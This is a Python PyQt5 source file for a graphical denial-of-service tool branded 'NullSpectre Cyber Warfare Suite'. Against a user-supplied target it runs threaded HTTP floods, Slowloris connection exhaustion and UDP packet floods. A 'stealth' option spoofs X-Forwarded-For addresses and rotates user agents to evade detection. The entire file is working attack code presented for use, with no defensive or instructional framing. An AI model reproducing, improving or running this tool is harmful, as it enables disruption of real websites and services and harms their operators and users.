import sys
import requests
import random
import socket
import threading
import time
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QTextEdit, QCheckBox, QSpacerItem, 
    QSizePolicy, QHBoxLayout, QProgressBar, QComboBox, QGroupBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QPixmap, QIcon, QFont, QColor
from PyQt5.QtWidgets import QGraphicsDropShadowEffect

class AttackThread(QThread):
    log_signal = pyqtSignal(str)
    stats_signal = pyqtSignal(dict)
    progress_signal = pyqtSignal(int)

    def __init__(self, target, attack_type, duration, intensity, stealth, proxy):
        super().__init__()
        self.target = target
        self.attack_type = attack_type
        self.duration = duration
        self.intensity = intensity
        self.stealth = stealth
        self.proxy = proxy
        self.running = True
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None

    def run(self):
        self.start_time = time.time()
        self.log_signal.emit("🔥 Initializing NullSpectre Attack Matrix...")
        self.log_signal.emit(f"⚡ Target: {self.target}")
        self.log_signal.emit(f"⚔️ Attack Type: {self.attack_type}")
        self.log_signal.emit(f"⏱ Duration: {self.duration} seconds")
        self.log_signal.emit(f"💣 Intensity: {self.intensity} threads")
        self.log_signal.emit("🚀 Launching cyber assault...\n")

        threads = []
        for i in range(self.intensity):
            if not self.running:
                break
            t = threading.Thread(target=self.attack_worker)
            t.daemon = True
            threads.append(t)
            t.start()

        # Monitor progress until duration expires
        while self.running and (time.time() - self.start_time) < self.duration:
            time.sleep(0.1)
            progress = int(((time.time() - self.start_time) / self.duration)) * 100
            self.progress_signal.emit(min(progress, 100))
            
            # Update stats every second
            self.stats_signal.emit({
                'requests': self.requests_sent,
                'success': self.successful_requests,
                'failed': self.failed_requests,
                'rps': self.requests_sent / max(1, (time.time() - self.start_time))
            })

        self.running = False
        for t in threads:
            t.join()

        self.log_signal.emit("\n✅ Attack completed successfully!")
        self.log_signal.emit(f"📊 Total Requests: {self.requests_sent}")
        self.log_signal.emit(f"✅ Successful: {self.successful_requests}")
        self.log_signal.emit(f"❌ Failed: {self.failed_requests}")
        self.log_signal.emit(f"⚡ Average RPS: {self.requests_sent / self.duration:.2f}")

    def attack_worker(self):
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                headers = self.generate_headers()
                payload = self.generate_payload()
                
                if self.attack_type == "HTTP Flood":
                    response = requests.get(
                        self.target, 
                        headers=headers,
                        timeout=5,
                        proxies=self.get_proxy() if self.proxy else None
                    )
                    status = response.status_code
                elif self.attack_type == "Slowloris":
                    self.slowloris_attack()
                    status = 200  # Assume success for Slowloris
                else:  # UDP Flood
                    self.udp_flood()
                    status = 200  # Assume success for UDP

                self.requests_sent += 1
                self.successful_requests += 1
                
                if self.requests_sent % 10 == 0:  # Update log every 10 requests
                    log_msg = f"[{datetime.now().strftime('%H:%M:%S')}] {self.attack_type} → {status} (Total: {self.requests_sent})"
                    self.log_signal.emit(log_msg)
                
            except Exception as e:
                self.requests_sent += 1
                self.failed_requests += 1
                if random.random() < 0.1:  # Log only 10% of errors to avoid flooding
                    self.log_signal.emit(f"[ERROR] {str(e)[:100]}...")

    def generate_headers(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive" if self.attack_type == "Slowloris" else "close",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }
        
        if self.stealth:
            headers.update({
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Referer": "https://www.google.com/",
                "DNT": "1"
            })
            
        return headers
    
    def generate_payload(self):
        if self.attack_type == "HTTP Flood":
            return None
        
        # For POST attacks or other types
        payloads = [
            {"username": "admin", "password": "password123"},
            {"search": "nullspectre" * 100},
            {"data": "A" * 1024}  # 1KB of data
        ]
        return random.choice(payloads)
    
    def get_proxy(self):
        # In a real implementation, you would fetch proxies from a pool
        proxies = [
            "http://proxy1.example.com:8080",
            "http://proxy2.example.com:3128",
            "http://proxy3.example.com:80"
        ]
        return {"http": random.choice(proxies), "https": random.choice(proxies)}
    
    def slowloris_attack(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target.replace("http://", "").replace("https://", "").split("/")[0], 80))
            
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.target}\r\n".encode())
            s.send("User-Agent: {}\r\n".format(random.choice(self.generate_headers()['User-Agent'])).encode())
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
            
            while self.running:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(15)
        except:
            pass
        finally:
            s.close()
    
    def udp_flood(self):
        try:
            target_ip = socket.gethostbyname(self.target.replace("http://", "").replace("https://", "").split("/")[0])
            port = random.randint(1, 65535)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)  # Packet size
            
            for _ in range(100):  # Send 100 packets per iteration
                if not self.running:
                    break
                s.sendto(bytes, (target_ip, port))
        except:
            pass
        finally:
            s.close()

    def stop(self):
        self.running = False
        self.log_signal.emit("\n⛔ Attack terminated by user!")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("NullSpectre Cyber Warfare Suite")
        self.setGeometry(100, 100, 900, 800)
        self.setWindowIcon(QIcon("icon.png"))  # Add your icon file
        
        # Main widget and layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        # Styling
        self.setStyleSheet("""
            QMainWindow {
                background-color: #121212;
            }
            QLabel {
                color: #e0e0e0;
                font-size: 12px;
            }
            QLineEdit, QTextEdit, QComboBox {
                background-color: #1e1e1e;
                color: #ffffff;
                border: 1px solid #444;
                border-radius: 4px;
                padding: 5px;
            }
            QPushButton {
                background-color: #d32f2f;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 8px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #f44336;
            }
            QPushButton:disabled {
                background-color: #666;
            }
            QGroupBox {
                border: 1px solid #444;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 15px;
                color: #bb86fc;
                font-weight: bold;
            }
            QProgressBar {
                border: 1px solid #444;
                border-radius: 4px;
                text-align: center;
                background-color: #1e1e1e;
            }
            QProgressBar::chunk {
                background-color: #bb86fc;
                width: 10px;
            }
        """)
        
        # Header with logo and title
        header = QHBoxLayout()
        
        # Logo label (replace with your logo)
        self.logo_label = QLabel()
        self.logo_label.setPixmap(QPixmap("logo.png").scaled(80, 80, Qt.KeepAspectRatio))
        header.addWidget(self.logo_label)
        
        # Title
        title = QLabel("NULLSPECTRE CYBER WARFARE SUITE")
        title.setStyleSheet("font-size: 24px; font-weight: bold; color: #bb86fc;")
        title.setAlignment(Qt.AlignCenter)
        header.addWidget(title, 1)
        
        # Version
        version = QLabel("v2.0.1")
        version.setStyleSheet("font-size: 12px; color: #666;")
        header.addWidget(version)
        
        main_layout.addLayout(header)
        
        # Attack configuration group
        config_group = QGroupBox("Attack Configuration")
        config_layout = QVBoxLayout()
        
        # Target URL
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel("Target URL:"))
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        target_layout.addWidget(self.url_input)
        config_layout.addLayout(target_layout)
        
        # Attack type
        attack_type_layout = QHBoxLayout()
        attack_type_layout.addWidget(QLabel("Attack Type:"))
        self.attack_type = QComboBox()
        self.attack_type.addItems(["HTTP Flood", "Slowloris", "UDP Flood"])
        attack_type_layout.addWidget(self.attack_type)
        config_layout.addLayout(attack_type_layout)
        
        # Duration and intensity
        params_layout = QHBoxLayout()
        
        duration_layout = QVBoxLayout()
        duration_layout.addWidget(QLabel("Duration (sec):"))
        self.duration_input = QLineEdit("60")
        duration_layout.addWidget(self.duration_input)
        params_layout.addLayout(duration_layout)
        
        intensity_layout = QVBoxLayout()
        intensity_layout.addWidget(QLabel("Intensity (threads):"))
        self.intensity_input = QLineEdit("50")
        intensity_layout.addWidget(self.intensity_input)
        params_layout.addLayout(intensity_layout)
        
        config_layout.addLayout(params_layout)
        
        # Options
        options_layout = QHBoxLayout()
        self.stealth_mode = QCheckBox("Stealth Mode")
        self.stealth_mode.setChecked(True)
        options_layout.addWidget(self.stealth_mode)
        
        self.use_proxy = QCheckBox("Proxy Rotation")
        options_layout.addWidget(self.use_proxy)
        
        self.random_payload = QCheckBox("Random Payloads")
        options_layout.addWidget(self.random_payload)
        config_layout.addLayout(options_layout)
        
        config_group.setLayout(config_layout)
        main_layout.addWidget(config_group)
        
        # Stats panel
        stats_group = QGroupBox("Attack Statistics")
        stats_layout = QHBoxLayout()
        
        self.requests_label = QLabel("Requests: 0")
        self.success_label = QLabel("Success: 0")
        self.failed_label = QLabel("Failed: 0")
        self.rps_label = QLabel("RPS: 0.00")
        
        for label in [self.requests_label, self.success_label, self.failed_label, self.rps_label]:
            label.setStyleSheet("font-weight: bold; color: #bb86fc;")
            stats_layout.addWidget(label)
        
        stats_group.setLayout(stats_layout)
        main_layout.addWidget(stats_group)
        
        # Progress bar
        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        self.progress.setTextVisible(True)
        main_layout.addWidget(self.progress)
        
        # Log output
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("font-family: 'Courier New'; font-size: 11px;")
        main_layout.addWidget(self.log_output)
        
        # Control buttons
        button_layout = QHBoxLayout()
        
        self.start_button = QPushButton("🚀 LAUNCH ATTACK")
        self.start_button.setStyleSheet("font-size: 14px;")
        self.start_button.clicked.connect(self.start_attack)
        button_layout.addWidget(self.start_button)
        
        self.stop_button = QPushButton("⛔ ABORT")
        self.stop_button.setStyleSheet("font-size: 14px; background-color: #444;")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_attack)
        button_layout.addWidget(self.stop_button)
        
        main_layout.addLayout(button_layout)
        
        # Status bar
        self.statusBar().showMessage("Ready")
        
        # Add shadow effects
        self.add_shadow_effect(config_group)
        self.add_shadow_effect(stats_group)
        self.add_shadow_effect(self.start_button)
        
        # Initialize attack thread
        self.attack_thread = None
        
    def add_shadow_effect(self, widget):
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(15)
        shadow.setColor(QColor(0, 0, 0, 180))
        shadow.setOffset(3, 3)
        widget.setGraphicsEffect(shadow)
        
    def log_message(self, message):
        """Add a message to the log output"""
        self.log_output.append(message)
        self.log_output.ensureCursorVisible()
        
    def update_stats(self, stats):
        """Update the statistics display"""
        self.requests_label.setText(f"Requests: {stats['requests']}")
        self.success_label.setText(f"Success: {stats['success']}")
        self.failed_label.setText(f"Failed: {stats['failed']}")
        self.rps_label.setText(f"RPS: {stats['rps']:.2f}")
        
    def start_attack(self):
        """Start the attack"""
        url = self.url_input.text().strip()
        if not url:
            self.log_message("⚠️ Please enter a target URL!")
            return
            
        try:
            duration = int(self.duration_input.text())
            intensity = int(self.intensity_input.text())
        except ValueError:
            self.log_message("⚠️ Please enter valid numbers for duration and intensity!")
            return
            
        attack_type = self.attack_type.currentText()
        stealth = self.stealth_mode.isChecked()
        proxy = self.use_proxy.isChecked()
        
        self.log_message("\n" + "="*50)
        self.log_message(f"🚀 Initializing {attack_type} attack on {url}")
        self.log_message(f"⏱ Duration: {duration} seconds | 💣 Intensity: {intensity} threads")
        self.log_message("="*50 + "\n")
        
        # Reset stats
        self.update_stats({'requests': 0, 'success': 0, 'failed': 0, 'rps': 0})
        self.progress.setValue(0)
        
        # Start attack thread
        self.attack_thread = AttackThread(
            url, attack_type, duration, intensity, stealth, proxy
        )
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.stats_signal.connect(self.update_stats)
        self.attack_thread.progress_signal.connect(self.progress.setValue)
        self.attack_thread.finished.connect(self.attack_finished)
        self.attack_thread.start()
        
        # Update UI
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.statusBar().showMessage("Attack in progress...")
        
    def stop_attack(self):
        """Stop the attack"""
        if self.attack_thread:
            self.attack_thread.stop()
            self.stop_button.setEnabled(False)
            self.statusBar().showMessage("Attack stopping...")
            
    def attack_finished(self):
        """Clean up after attack finishes"""
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.statusBar().showMessage("Attack completed")
        
    def closeEvent(self, event):
        """Ensure attack stops when window closes"""
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.wait()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application font
    font = QFont("Segoe UI", 9)
    app.setFont(font)
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())